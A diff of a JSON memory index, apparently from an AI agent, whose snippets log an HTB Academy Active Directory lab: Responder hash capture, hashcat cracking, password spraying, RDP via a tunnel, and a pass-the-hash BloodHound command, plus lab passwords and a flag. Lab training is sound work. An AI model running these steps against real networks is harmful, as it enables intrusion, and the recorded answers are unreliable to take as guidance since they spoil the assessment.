@@ -1,6 +1,6 @@
 {
   "version": 1,
-  "updatedAt": "2026-05-02T19:00:10.403Z",
+  "updatedAt": "2026-05-03T19:00:09.115Z",
   "entries": {
     "memory:memory/2026-04-09.md:4:4": {
       "key": "memory:memory/2026-04-09.md:4:4",
@@ -64891,14 +64891,14 @@
       "startLine": 5,
       "endLine": 7,
       "source": "memory",
-      "snippet": "**Session Start:** ~22:00 (Asia/Manila) **Status:** IN PROGRESS — Q1/Q2 complete, advancing toward Q3-Q12 **Next Session:** Continue from smbclient/MS01 enumeration",
+      "snippet": "HTB Academy: AD Enumeration Attacks — Part II (Skills Assessment): **Session Start:** ~22:00 (Asia/Manila) **Status:** IN PROGRESS — Q1/Q2 complete, advancing toward Q3-Q12 **Next Session:** Continue from smbclient/MS01 enumeration",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -64907,7 +64907,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "asia/manila",
@@ -64929,12 +64930,12 @@
       "source": "memory",
       "snippet": "Target Environment: **Attack Host:** Parrot Linux VM at `10.129.83.248` / `172.16.7.240`; **Domain:** INLANEFREIGHT.LOCAL; **Subnet:** 172.16.6.0/23 (internal network via `ens224`)",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -64943,7 +64944,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "network",
@@ -64962,14 +64964,14 @@
       "startLine": 16,
       "endLine": 19,
       "source": "memory",
-      "snippet": "| Host | IP | Open Ports | Notes | |------|-----|------------|-------| | DC01 | 172.16.7.3 | 53, 135, 139, 445 | SMB signing **required** | | MS01 | 172.16.7.50 | 135, 139, 445, **3389** | SMB signing **not required** |",
+      "snippet": "Network Map Discovered: | Host | IP | Open Ports | Notes | |------|-----|------------|-------| | DC01 | 172.16.7.3 | 53, 135, 139, 445 | SMB signing **required** | | MS01 | 172.16.7.50 | 135, 139, 445, **3389** | SMB signing **not required** |",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -64978,7 +64980,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "network",
@@ -64998,14 +65001,14 @@
       "startLine": 20,
       "endLine": 21,
       "source": "memory",
-      "snippet": "| SQL01 | 172.16.7.60 | 135, 139, 445, **1433** | MSSQL 2019 SQLEXPRESS; SMB signing **not required** | | Parrot VM | 172.16.7.240 | 22, 3389 | Attack host |",
+      "snippet": "Network Map Discovered: | SQL01 | 172.16.7.60 | 135, 139, 445, **1433** | MSSQL 2019 SQLEXPRESS; SMB signing **not required** | | Parrot VM | 172.16.7.240 | 22, 3389 | Attack host |",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -65014,7 +65017,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "network",
@@ -65036,12 +65040,12 @@
       "source": "memory",
       "snippet": "Recon (Complete): Nmap ping sweep found 4 live hosts: DC01, MS01, SQL01, Parrot VM; Top-20 port scan identified services; `/etc/hosts` updated with all internal hosts",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -65050,7 +65054,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "top-20",
@@ -65071,12 +65076,12 @@
       "source": "memory",
       "snippet": "Q1: Domain User Hash (Complete): Ran Responder on `ens224`; Captured NTLMv2-SSP hash for `INLANEFREIGHT\\AB920` from DC01 (172.16.7.3); **Answer: `AB920`**",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -65085,7 +65090,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "ntlmv2-ssp",
@@ -65106,12 +65112,12 @@
       "source": "memory",
       "snippet": "Q2: Cleartext Password (Complete): Cracked hash with hashcat mode 5600 + rockyou.txt; **Answer: `weasal`**",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -65120,7 +65126,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "rockyou.txt",
@@ -65141,12 +65148,12 @@
       "source": "memory",
       "snippet": "MS01 Access (In Progress): Validated creds with `crackmapexec smb MS01 -u AB920 -p weasal` → **valid, but NOT local admin** (no `Pwn3d!`); WinRM (5985) not open on MS01; Next step: `smbclient` to enumerate shares, then RDP or wmiexec for shell access",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -65155,7 +65162,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "ms01",
@@ -65172,16 +65180,16 @@
       "key": "memory:memory/2026-04-28.md:46:49",
       "path": "memory/2026-04-28.md",
       "startLine": 46,
-      "endLine": 49,
+      "endLine": 48,
       "source": "memory",
-      "snippet": "Questions Status: | # | Question | Answer | Status | |---|----------|--------|--------| | 1 | Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name? | `AB920` | ✅ | | 2 | What is this user's cleartext pas",
+      "snippet": "| # | Question | Answer | Status | |---|----------|--------|--------| | 1 | Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name? | `AB920` | ✅ |",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -65190,7 +65198,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "questions",
@@ -65201,22 +65210,23 @@
         "password",
         "hash",
         "domain"
-      ]
+      ],
+      "promotedAt": "2026-05-03T19:00:09.115Z"
     },
     "memory:memory/2026-04-28.md:50:53": {
       "key": "memory:memory/2026-04-28.md:50:53",
       "path": "memory/2026-04-28.md",
       "startLine": 50,
-      "endLine": 53,
+      "endLine": 52,
       "source": "memory",
-      "snippet": "Questions Status: | 3 | Submit the contents of the flag.txt file on MS01. | | ⏳ | | 4 | Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain. | | ⏳ | | 5 | What is this user's password? | | ⏳ | | 6 | Locate",
+      "snippet": "| 3 | Submit the contents of the flag.txt file on MS01. | | ⏳ | | 4 | Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain. | | ⏳ | | 5 | What is this user's password? | | ⏳ |",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -65225,7 +65235,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "flag.txt",
@@ -65236,22 +65247,23 @@
         "ms01",
         "use",
         "common"
-      ]
+      ],
+      "promotedAt": "2026-05-03T19:00:09.115Z"
     },
     "memory:memory/2026-04-28.md:54:57": {
       "key": "memory:memory/2026-04-28.md:54:57",
       "path": "memory/2026-04-28.md",
       "startLine": 54,
-      "endLine": 57,
+      "endLine": 55,
       "source": "memory",
-      "snippet": "Questions Status: | 7 | Submit the contents of the flag.txt file on the Administrator Desktop on SQL01. | | ⏳ | | 8 | Submit the contents of the flag.txt file on the Administrator Desktop on MS01. | | ⏳ | | 9 | Obtain credentials for a user who has GenericAll rights over the Doma",
+      "snippet": "| 7 | Submit the contents of the flag.txt file on the Administrator Desktop on SQL01. | | ⏳ | | 8 | Submit the contents of the flag.txt file on the Administrator Desktop on MS01. | | ⏳ |",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -65260,7 +65272,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "flag.txt",
@@ -65271,7 +65284,8 @@
         "administrator",
         "desktop",
         "sql01"
-      ]
+      ],
+      "promotedAt": "2026-05-03T19:00:09.115Z"
     },
     "memory:memory/2026-04-28.md:58:59": {
       "key": "memory:memory/2026-04-28.md:58:59",
@@ -65279,14 +65293,14 @@
       "startLine": 58,
       "endLine": 59,
       "source": "memory",
-      "snippet": "Questions Status: | 11 | Submit the contents of the flag.txt file on the Administrator desktop on DC01. | | ⏳ | | 12 | Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise. | | ⏳ |",
+      "snippet": "| 11 | Submit the contents of the flag.txt file on the Administrator desktop on DC01. | | ⏳ | | 12 | Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise. | | ⏳ |",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -65295,7 +65309,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "flag.txt",
@@ -65306,7 +65321,8 @@
         "administrator",
         "desktop",
         "dc01"
-      ]
+      ],
+      "promotedAt": "2026-05-03T19:00:09.115Z"
     },
     "memory:memory/2026-04-28.md:62:65": {
       "key": "memory:memory/2026-04-28.md:62:65",
@@ -65316,12 +65332,12 @@
       "source": "memory",
       "snippet": "Next Steps (For Next Session): Run `smbclient -L MS01 -U AB920%weasal` to enumerate shares; If shares don't yield flags, RDP or wmiexec into MS01; On MS01: run BloodHound SharpHound or PowerView to find attack paths; Look for MSSQL connection strings (Q6 target)",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -65330,7 +65346,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "steps",
@@ -65351,12 +65368,12 @@
       "source": "memory",
       "snippet": "Next Steps (For Next Session): Look for weak credentials via common methods (password reuse, config files); Identify user with GenericAll over Domain Admins (Q9)",
       "recallCount": 0,
-      "dailyCount": 4,
+      "dailyCount": 5,
       "groundedCount": 0,
-      "totalScore": 2.48,
+      "totalScore": 3.1,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-28T19:00:07.312Z",
-      "lastRecalledAt": "2026-05-02T19:00:10.403Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "1174d07d7efc"
       ],
@@ -65365,7 +65382,8 @@
         "2026-04-28",
         "2026-05-01",
         "2026-05-02",
-        "2026-05-03"
+        "2026-05-03",
+        "2026-05-04"
       ],
       "conceptTags": [
         "steps",
@@ -66279,17 +66297,19 @@
       "source": "memory",
       "snippet": "Part II Progress Summary: | Q | Question | Status | Notes | |---|----------|--------|-------| | 1 | User account obtained from Responder | ✅ | `AB920` | | 2 | Password | ✅ | `weasal` (cracked from NTLMv2 hash) |",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "progress",
@@ -66310,17 +66330,19 @@
       "source": "memory",
       "snippet": "Part II Progress Summary: | 3 | Submit flag.txt on MS01 | ✅ | `aud1t_gr0up_m3mbersh1ps!` | | 4 | Common method to obtain weak creds for another user | ✅ | **Password spraying** via `DomainPasswordSpray` | | 5 | Another user's credentials | ✅ | `BR086:Welcome1` | | 6 | MSSQL conne",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "flag.txt",
@@ -66341,17 +66363,19 @@
       "source": "memory",
       "snippet": "Part II Progress Summary: | 7 | Submit flag.txt on SQL01 | ⏳ | Need SQL01 access | | 8 | Submit flag.txt on MS01 as Administrator | ⏳ | Need privesc on MS01 | | 9 | User with GenericAll over Domain Admins | ⏳ | Need BloodHound | | 10 | Crack that user's password | ⏳ | Need Q9 fir",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "flag.txt",
@@ -66372,17 +66396,19 @@
       "source": "memory",
       "snippet": "Part II Progress Summary: | 11 | Submit flag.txt on DC01 | ⏳ | Need Domain Admin | | 12 | KRBTGT hash | ⏳ | Need DA + DCSync |",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "flag.txt",
@@ -66403,17 +66429,19 @@
       "source": "memory",
       "snippet": "Today's Actions: **1. Ligolo tunnel established** ✅",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "today's",
@@ -66431,17 +66459,19 @@
       "source": "memory",
       "snippet": "Today's Actions: Attack host → Parrot VM (ligolo agent) → internal subnet `172.16.6.0/23`; Route: `sudo ip route add 172.16.6.0/23 dev ligolo`; Verified: `ping 172.16.7.50` works (200ms latency)",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "172.16.6.0/23",
@@ -66462,17 +66492,19 @@
       "source": "memory",
       "snippet": "Today's Actions: **2. RDP to MS01 via tunnel** ✅",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "today's",
@@ -66491,17 +66523,19 @@
       "source": "memory",
       "snippet": "Today's Actions: `xfreerdp3 /v:172.16.7.50 /u:AB920 /p:weasal /cert:ignore`; Successfully logged in as `AB920`",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "172.16.7.50",
@@ -66522,17 +66556,19 @@
       "source": "memory",
       "snippet": "Today's Actions: **3. Q3 Flag captured** ✅",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "today's",
@@ -66549,17 +66585,19 @@
       "source": "memory",
       "snippet": "Today's Actions: `type C:\\Users\\Administrator\\Desktop\\flag.txt` → `aud1t_gr0up_m3mbersh1ps!`",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "flag.txt",
@@ -66580,17 +66618,19 @@
       "source": "memory",
       "snippet": "Today's Actions: **4. MS01 Local Enumeration (as AB920)**",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "today's",
@@ -66609,17 +66649,19 @@
       "source": "memory",
       "snippet": "Today's Actions: `whoami /groups` — AB920 is NOT local admin; `systeminfo` — Windows 10 / Server 2019 Build 17763; Connection string search (PowerShell) — only found generic .NET Framework defaults (`LocalSqlServer`, etc.); File hunt for creds — found `ConsoleHost_history.txt` bu",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "consolehost-history.txt",
@@ -66640,17 +66682,19 @@
       "source": "memory",
       "snippet": "Today's Actions: `net user /domain` — **Access is denied** (AB920 lacks enumeration rights)",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "today's",
@@ -66671,17 +66715,19 @@
       "source": "memory",
       "snippet": "Today's Actions: **5. DomainPasswordSpray from MS01** ✅",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-01T02:41:27.509Z",
-      "lastRecalledAt": "2026-05-01T02:41:27.509Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
       "queryHashes": [
         "e757f9360616"
       ],
       "recallDays": [
-        "2026-05-01"
+        "2026-05-01",
+        "2026-05-04",
+        "2026-05-03"
       ],
       "conceptTags": [
         "today's",
@@ -72831,6 +72877,2216 @@
         "directly",
         "local",
         "filesystem"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:147:147": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:147:147",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 147,
+      "endLine": 147,
+      "source": "memory",
+      "snippet": "User: Syntax is wrong?",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "syntax",
+        "wrong"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:148:148": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:148:148",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 148,
+      "endLine": 148,
+      "source": "memory",
+      "snippet": "Assistant: Right — **bloodhound.py hash syntax is picky**. You need the full `LMHASH:NTHASH` format (empty LM hash + colon + NT hash). **Corrected syntax:** **Option A: Use BR086 password (simplest):** ```bash bloodhound-python -d INLANEFREIGHT.LOCAL -u BR086 -p 'Welcome1' -c All",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "bloodhound.py",
+        "bloodhound-python",
+        "inlanefreight.local",
+        "right",
+        "hash",
+        "syntax",
+        "picky",
+        "need"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:149:149": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:149:149",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 149,
+      "endLine": 149,
+      "source": "memory",
+      "snippet": "Assistant: Try **Option A** with BR086 first — password auth is more reliable. What does the output show?",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "try",
+        "option",
+        "br086",
+        "first",
+        "password",
+        "auth",
+        "reliable",
+        "what"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:150:150": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:150:150",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 150,
+      "endLine": 150,
+      "source": "memory",
+      "snippet": "User: └─$ bloodhound-python -d INLANEFREIGHT.LOCAL -u Administrator --hashes bdaffbfe64f1fc646a3353be1c2c3c99 -c All -ns 172.16.7.3 --zip INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3) Traceback (most recent call last): File \"/usr/bin/bloodhound-python\", line",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
